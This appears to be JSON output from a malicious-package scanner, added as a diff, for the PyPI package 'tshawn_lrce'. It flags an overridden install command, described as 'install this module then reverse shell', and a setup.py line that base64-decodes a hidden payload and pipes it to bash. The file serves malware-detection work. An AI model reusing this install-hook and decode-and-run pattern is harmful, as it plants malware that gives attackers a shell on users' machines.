@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:18",
+                "code": "setup(name='tshawn_lrce',   # \u5e93\u7684\u540d\u5b57\n      version='0.0.1',  # \u7248\u672c\n      description=\"install this module then reverse shell\", # \u63cf\u8ff0\n      author=\"dpm\", # \u4f5c\u8005\n      py_module=[\"tshawn.hello\"], # \u8fd9\u91cc\u901a\u8fc7\u624b\u52a8\u6307\u5b9a\u7684\u65b9\u5f0f\uff0c\u6307\u5b9a\u9700\u8981\u6253\u5305\u7684\u6a21\u5757\n      cmdclass={'install': C...\u6267\u884c\n     )\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:15",
+                "code": "    os.system('echo %s|base64 -d|bash' % encoded.decode())\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/tshawn_lrce-0.0.1"
+}
